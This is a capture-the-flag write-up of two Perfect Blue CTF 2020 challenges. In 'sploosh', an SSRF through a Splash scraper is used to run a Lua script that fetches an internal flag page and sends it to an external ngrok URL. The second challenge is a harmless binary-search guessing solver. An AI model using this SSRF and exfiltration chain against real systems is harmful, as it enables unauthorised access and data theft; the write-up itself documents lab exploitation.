+++
title = "Perfect Blue CTF 2020"
date = 2020-12-06

[taxonomies]
tags = ["ctf-writeups"]
+++



# sploosh

```text
I wanted to make my own URL scraper, but parsing HTML is hard, so I used some random open source scraping project instead.

http://sploosh.chal.perfect.blue/

By: Corb3nik
```

## initial review

![entry page to sploosh](/ctf/pbctf-2020/sploosh_intro.png)

Nothing particularly interesting here -- it will scrape a website and tell you the viewport geometry.  We're provided source code so i'm not going to bother looking harder at this.  

### docker

```yml
version: "3.8"
services:
  webapp:
    build: .
    env_file:
      - ./flag.env
    networks:
      sploosh_internal:
        ipv4_address: 172.16.0.14

    ports:
      - 9000:80
    volumes:
      - ./src:/var/www/html/:ro

  splash:
    image: scrapinghub/splash
    networks:
      sploosh_internal:
        ipv4_address: 172.16.0.13

networks:
  sploosh_internal:
    ipam:
      driver: default
      config:
        - subnet: 172.16.0.0/24
```

So we have a generally accessible wrapper around some public repository "splash" which seems likely to be a scraping tool of some sort.  

### flag.php

```php
<?php

$FLAG = getenv("FLAG");

$remote_ip = $_SERVER['REMOTE_ADDR'];
if ($remote_ip === "172.16.0.13" || $remote_ip === '172.16.0.14') {
  echo $FLAG;
} else {
  echo "No flag for you :)";
}
?>
```
ok so its an [SSRF](https://portswigger.net/web-security/ssrf).  Nice to have confirmation lol.  We get the flag if the source address is either one of the docker containers.  Unfortunately our scrapping access point only tells us the viewport geometry (which will be constant for all web pages because its essentially just the emulated screen size of webkit) so we don't have much to work with here.  

### api.php

```php
<?php
error_reporting(0);

header("Content-Type: application/json");

function fail() {
  echo "{}";
  die();
}

if (!isset($_GET['url'])) {
  fail();
}


$url = $_GET['url'];

if ($url === '') {
  fail();
}

try {
  $json = file_get_contents("http://splash:8050/render.json?timeout=1&url=" . urlencode($url));
  $out = array("geometry" => json_decode($json)->geometry);
  echo json_encode($out);
} catch(Exception $e) {
  fail();
}
?>
```

Well this is interesting!  Although it didn't end up panning out solution-wise, you can pollute parameters for /render.json.  I spend an awfully large amount of time trying to use the js_source parameter (which executes arbitrary JS in the context of the scraped page) to make a network request.  

### what can scrapinghub/splash do?  

There doesn't seem to be anything useful for flag gathering in sploosh, so lets take a look at the scraping API it calls!  `/render.json` has a number of parameters we can set if we wish (show html, show png, execute arbitrary js in the context of the page) but the issue is we only ever see the geometry of the page.  My first thought was that you could use JS to change the geometry of the page and then essentially binary search your way through the flag.  That didn't work out because you can't (easily) make external http requests or change the geometry size.  

What else can Splash do?  Well it can render it as html, png, jpeg, etc.  It also has an execute route which uh executes a Lua script to handle more obscure scraping use cases.  The script is passed in through a GET query parameter which means that we can make this request from Sploosh!  Executing code from this context can obviously make network requests (because it has to for scraping) so very likely this will get us the flag.  

A few minutes later we have a payload and just need to url encode it and pass it to Sploosh.  Probably could've made it return the flag in geometry but I already had ngrok running for my js_source try so that happened first lol.   
```lua
http://splash:8050/execute?lua_source=function main(splash)
    treat = require("treat")
    i, j = treat.as_string(splash:http_get("http://172.16.0.14/flag.php").body)
    local dest = "http://801a64a6dc80.ngrok.io/" .. i
    splash:http_get(dest)
    return 'hello'
end
```

flag: pbctf{1_h0p3_y0u_us3d_lua_f0r_th1s}

# find rbtree

```text
Find rbtree among hundreds of people

nc find-rbtree.chal.perfect.blue 1

Update: The challenge.py was updated at 01:00 UTC, 6th Dec. Please redownload if you have downloaded prior to that.

By: sampriti & rbtree
```

[find_rbtree.py](/ctf/pbctf-2020/find_rbtree.py)

## initial review

```python
def stage(num_stage, num_people, num_ask):
    print("STAGE {} / 30".format(num_stage))
    print("Generating people... (and rbtree)")

    people = list(itertools.product(*prop.values()))
    random.shuffle(people)
    people = people[:num_people]
    rbtree = random.choice(people)
    print(rbtree)
    print("=" * 29)
    for idx, person in enumerate(people):
        print(" ".join(" [PERSON {:4d}] ".format(idx + 1)))
        for prop_name, prop_val in zip(prop.keys(), person):
            print("{:14s}: {}".format(prop_name, prop_val))
        print("=" * 29)

    print("Now ask me!")

    for i in range(num_ask):
        prop_name = input("? > ")
        if prop_name == 'Solution':
            break
        if prop_name not in prop:
            return False
        
        prop_ask = input("! > ").strip().split(' ')
        for val in prop_ask:
            if val not in prop[prop_name]:
                return False

        if set(rbtree) & set(prop_ask):
            print("YES")
        else:
            print("NO")

    rbtree_guess = tuple(input("rbtree > ").strip().split(' '))
    print(rbtree_guess)
    print(rbtree)
    if rbtree == rbtree_guess:
        return True
    else:
        return False

def main():
    print(welcome)

    cases = [(5, 3), (7, 3), (10, 4), (15, 4), (20, 5), (25, 5), (50, 6), (75, 7), (100, 8), (250, 9)]
    cases += [(400, 10)] * 5 + [(750, 11)] * 5 + [(1000, 12)] * 5 + [(1600, 12)] * 5

    for idx, (num_people, num_ask) in enumerate(cases):
        if not stage(idx + 1, num_people, num_ask):
            print("WRONG :(")
            return
        print("You found rbtree!")

    with open("flag.txt", "r") as f:
        print(f.read())
```

It will display a (varying with round number) number of randomly generated people and select one of them to be rbtree.  To pass that round (there are 30 rounds total) you need to correctly guess every item of clothing rbtree is wearing.  To assist us, we may ask if rbtree is wearing a specific item of clothing a few times before we try and guess.  

## attack

The first thing I noticed when I looked at the cases list was that the number of times we can ask a question is just slightly over log2(num_people).  If we can filter out half the list with every question then when we run out of questions we will have only a single person left who must be rbtree.  The list of people is randomly generated so we won't always be able to narrow it down to a single person, but its fairly trivial to just try again if we fail since it shouldn't happen often enough to make it intractable.  I uh also threaded it because i was bored and could.  

```python
from pwn import *
import re
from collections import defaultdict
import pprint
from flatten_dict import flatten
import json
import sys
import random
import threading
pp = pprint.PrettyPrinter(indent=4)

prop = {
    "Eyewear": ["Glasses", "Monocle", "None"],
    "Eye color": ["Brown", "Blue", "Hazel"],
    "Hair": ["Straight", "Curly", "Bald"],
    "Outerwear": ["Coat", "Hoodie", "Poncho"],
    "T-shirt color": ["Red", "Orange", "Green"],
    "Trousers": ["Jeans", "Leggings", "Sweatpants"],
    "Socks color": ["Black", "Gray", "White"],
    "Shoes": ["Boots", "Slippers", "Sneakers"],
}

def conn():
    # return process(["python","find_rbtree.py"])
    return remote("find-rbtree.chal.perfect.blue",1)

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

cases = [(5, 3), (7, 3), (10, 4), (15, 4), (20, 5), (25, 5), (50, 6), (75, 7), (100, 8), (250, 9)]
cases += [(400, 10)] * 5 + [(750, 11)] * 5 + [(1000, 12)] * 5 + [(1600, 12)] * 5

mutex = threading.Lock()
tries = 0


thread_no = 1

thread_status = defaultdict(str)

def attempt():
    global tries
    round_no = 0
    attempt_at_start = tries
    p = conn()
    def ask(key, value):
        (p.recvuntil("? > "))
        p.sendline(key)
        (p.recvuntil("! > "))
        p.sendline(value)
        res = p.recvline().decode()
        if res.count("YES") > 0:
            return True
        elif res.count("NO") > 0:
            return False
        else:
            print("wtf???", key, value)
            print(1 + "")

    def get_best_filter(people):
        """
        The idea here is to search for the item of clothing
        which comes closest to letting us divide the list of people in half
        """
        count = defaultdict(dict)
        for key in prop.keys():
            for possible in prop[key]:
                count[key][possible] = json.dumps(people).count(possible)
        flattened_count = {k:abs((len(people)/2)-v) for k, v in flatten(count).items()}
        return min(flattened_count, key=flattened_count.get)

    def figure_rbtree(people):
        nonlocal round_no
        people_count, guesses = cases[round_no]
        if round_no > 0 or True:
            mutex.acquire()
            thread_status[threading.currentThread().ident] = (threading.currentThread().ident,attempt_at_start,round_no + 1)
            mutex.release()
        count = 0
        while len(people) != 1:

            k,v = get_best_filter(people)
            if ask(k,v):
                people = list(filter(lambda x: x[k] == v, people))
            else:
                people = list(filter(lambda x: x[k] != v, people))
            count += 1
            if count == guesses: # guess from the remainder lol
                round_no += 1
                return (False, random.choice(people))
        round_no += 1
        return (True, people[0])

    def solve_round():
        original_data = p.recvuntil("Now ask me!\n").decode()
        data = original_data.replace(" ","").replace("Eyecolor", "Eye color").replace("T-shirtcolor", "T-shirt color").replace("Sockscolor","Socks color")

        people = [dict(x) for x in chunks(re.findall("(.*):(.*)",data),8)]
        early, r = figure_rbtree(people)
        answer = f"{r['Eyewear']} {r['Eye color']} {r['Hair']} {r['Outerwear']} {r['T-shirt color']} {r['Trousers']} {r['Socks color']} {r['Shoes']}"
        if early:
            p.sendline("Solution")
        p.sendline(answer)

    try:
        for i in range(30):
            solve_round()
        response = p.recvall().decode()
        print(response)
        import os
        os.kill(os.getpid(), signal.SIGKILL)
        return True
    except EOFError:
        p.close()
        time.sleep(5)
        return False


def loop():
    global tries 
    while True:
        mutex.acquire()
        tries += 1
        mutex.release()
        attempt()

def stats():
    import os
    import time
    while True:
        mutex.acquire()
        for k, v in sorted(thread_status.items(),key=lambda x: x[1][2]):
            print(f"{v[0]}, attempt = {v[1]}, round = {v[2]}")
        mutex.release()
        time.sleep(2)

threads = []
for i in range(thread_no):
    t1 = threading.Thread(target=loop)
    t1.start()
    threads.append(t1)

stats = threading.Thread(target=stats)
stats.start()

for i in threads:
    i.join()
```